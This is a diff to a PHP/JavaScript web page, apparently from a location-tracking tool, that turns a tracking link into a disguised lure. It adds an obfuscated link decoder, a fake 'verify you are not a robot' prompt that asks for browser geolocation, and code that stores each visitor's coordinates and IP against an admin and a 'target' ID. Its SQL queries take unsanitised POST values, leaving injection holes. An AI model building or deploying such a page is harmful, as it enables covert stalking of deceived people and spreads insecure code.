@@ -48,11 +48,69 @@ require('__ROOT__/class_cn.php');
 else
   {
       
-      
-$device_bl =  $_SERVER["REMOTE_ADDR"];
-$device_ad = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+ function decrypt_url($string) {
+    $key = "MAL_979805"; //key to encrypt and decrypts.
+    $result = '';
+    $string = base64_decode(urldecode($string));
+   for($i=0; $i<strlen($string); $i++) {
+     $char = substr($string, $i, 1);
+     $keychar = substr($key, ($i % strlen($key))-1, 1);
+     $char = chr(ord($char)-ord($keychar));
+     $result.=$char;
+   }
+   return $result;
+}
 
-$device_adm = substr($device_ad, strpos($device_ad, "=") + 1);    
+  
+
+
+$target_bl =  $_SERVER["REMOTE_ADDR"];
+
+$target_st = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";  
+
+$target_str = substr($target_st, strpos($target_st, "=") + 1);    
+
+
+  $protocol = $_SERVER['SERVER_PORT'];
+
+      if ($protocol == '443')
+         {
+         $protocol = 'https://';
+         }
+
+      else if ($protocol == '80')
+           {
+           $protocol = 'http://';
+           }
+
+        $url = $_SERVER['SERVER_NAME'];
+
+         
+        $link_start = $protocol .$url ."view_tar.php?=";
+ 
+        $link_end = decrypt_url($target_str); 
+  
+        $full_link = $link_start.$link_end;
+
+        // echo $full_link ."<br>"; 
+        
+  
+ 
+        
+     $target_adm = $link_end;
+     $target_adm = strstr($target_adm, "!"); //gets all text from needle on
+     $target_adm = strstr($target_adm, "-", true); //gets all text before needle
+     $target_adm = substr($target_adm, 1); 
+
+ 
+     $target_targ = $link_end;
+     $target_targ = strstr($target_targ, "-"); //gets all text from needle on
+     $target_targ = strstr($target_targ, "_", true); //gets all text before needle
+     $target_targ = substr($target_targ, 1); 
+
+
+     //echo $target_adm ."<br>" .$target_targ;
+
 
 $sql_block = "select device_id, admin from devices_blocked";
 $result_block = $conn->query($sql_block);
@@ -61,13 +119,13 @@ $result_block = $conn->query($sql_block);
 while ($row_block = $result_block->fetch_assoc())
           {
               
-           $device_block = $row_block['device_id'];
-           $device_admin = $row_block['admin'];
+           $target_block = $row_block['device_id'];
+           $target_admin = $row_block['admin'];
            
           } // end of while
           
           
-          if ($device_block == $device_bl && $device_admin == $device_adm)
+          if ($target_block == $target_bl && $target_admin == $target_adm)
               {
                 exit;  
                }  
@@ -105,16 +163,26 @@ function showLocation(position)
          {
     var latitude = position.coords.latitude;
     var longitude = position.coords.longitude;
-    //var admin     = window.location.href;
 
-    var str = window.location.href;
+
+    var str = "<?php echo $full_link; ?>;";
+
     var admin = str.split('=').pop();
+    var admin = admin.split('!').pop();
+    var admin = admin.split('-')[0];
+
+    var target = str.split('=').pop();
+    var target = target.split('!').pop();
+    var target = target.split('-').pop();
+    var target = target.split('_')[0];
+
 
     $.ajax({
         type:'POST',
-        url:'view.php',
+        url:'view_tar.php',
         data:{
              admin : admin, 
+             target : target, 
              latitude : latitude,
              longitude : longitude
               },
@@ -137,6 +205,9 @@ function showLocation(position)
 </script>
 
 <style>
+
+
+/*
 body
 {
 background: url(assets/img/view_back.png);
@@ -144,13 +215,13 @@ background-repeat: no-repeat;
 background-size:100%;
 background-position: 50% 50%; 
 }
-
+*/
 
 .blink_me {
   animation: blinker 2s linear infinite;
-  color: white;
+  color: black;
   font-weight: bold;
-  font-size: 50px;
+  font-size: 30px;
 }
 
 @keyframes blinker {
@@ -164,23 +235,34 @@ background-position: 50% 50%;
 </head>
 
 <body>
-    
-     
-  <!-- <p>  <span id="location"></span></p> -->
 
 
-   <!-- <div class="blink_me" align="center"> SEARCH LOCATION </div> -->
+     <!--
+
+      <p>  <span id="location"></span></p> 
+
+        -->
+
+      
+      <div align="center"> 
+         <h1> 
+           Open your location to verifying you are not a robot and see the content
+         </h1> 
+         <br>
+         <img src="assets/img/view_back.png" height="600" width="600">
+      </div> 
+
 
 </body>
 </html>
 
 <?php
 
+
+
   $conn = new mysqli($host,$user,$pass,$db);
 
-
-$device_id =  $_SERVER["REMOTE_ADDR"];
-
+$device_id   =  $_SERVER["REMOTE_ADDR"];
 $last_ip   =  $_SERVER["REMOTE_ADDR"];
 
 $length = 32;
@@ -188,25 +270,12 @@ $fingerprint = substr(str_shuffle(md5(time())), 0, $length);
 
 
 $admin = $_POST['admin'];
+$target_id = $_POST['target'];
+
+echo $admin ."<br>" .$target_id;
+
 $latitude = $_POST['latitude'];
 $longitude = $_POST['longitude'];
-
-
-
-#$send_url = "https://maps.googleapis.com/maps/api/geocode/json?latlng=" + latitude +"," + longitude + "?key=AIzaSyBlB92xDe6fwQJpCBh96Ic6PqpRNVOvnSM&callback=initMap"
-
-#send_url = "http://maps.googleapis.com/maps/api/geocode/json?latlng=" + latitude +"," + longitude + "&sensor=true/false"
-
-#send_url = "https://geocode.xyz/" + latitude +"," + longitude + "?json=1"
-
-#request = requests.get(send_url)
-#json = json.loads(request.text)
-
-
-#send_url = "https://geocode.xyz/"38.4388185,21.3490225,16"?json=1" 
-
-#address = json['poi']['amenity']
-
 
 
 $address = "Here";
@@ -231,25 +300,38 @@ $result_mode = $conn->query($sql_mode);
        if (!empty($admin . $latitude . $longitude))
              {
 
-       $sql_norm_dev = "insert into devices(admin,device_id, last_ip, latitude, longitude, address, fingerprint, all_info) values ('$admin','$device_id','$last_ip','$latitude','$longitude','$address','$fingerprint','$all_info')";
+ $sql_norm_dev = "update targets set last_ip = '$last_ip', instant = NOW(), 
+                                     latitude = '$latitude', longitude = '$longitude', 
+                                     address = '$address', fingerprint = '$fingerprint', 
+                                     all_info = '$all_info'
+                  where admin = '$admin' and target_id = '$target_id'";
 
+  
 
+ $sql_back_dev = "update backup_targets set last_ip = '$last_ip', instant = NOW(), 
+                                     latitude = '$latitude', longitude = '$longitude', 
+                                     address = '$address', fingerprint = '$fingerprint', 
+                                     all_info = '$all_info'
+                  where admin = '$admin' and target_id = '$target_id'";
 
-       $sql_back_dev = "insert into backup_devices(admin,device_id, last_ip, latitude, longitude, address, fingerprint, all_info) values ('$admin','$device_id','$last_ip','$latitude','$longitude','$address','$fingerprint','$all_info')";
 
        $result_norm_dev = $conn->query($sql_norm_dev);
-       $result_back_dev = $conn->query($sql_back_dev);
+  
+
+       if ($result_norm_dev == true)
+           {
+            $result_back_dev = $conn->query($sql_back_dev); 
+             }
+
 
        sleep($time_of_renewal);
 
            } // check for empty fields
-           
-           
-        } // end if for else block devices
+
+
+        } // end for else block devices
        
-               
-   // } // end while for chech block devices
-    
+
 
 } // end of else connect
 
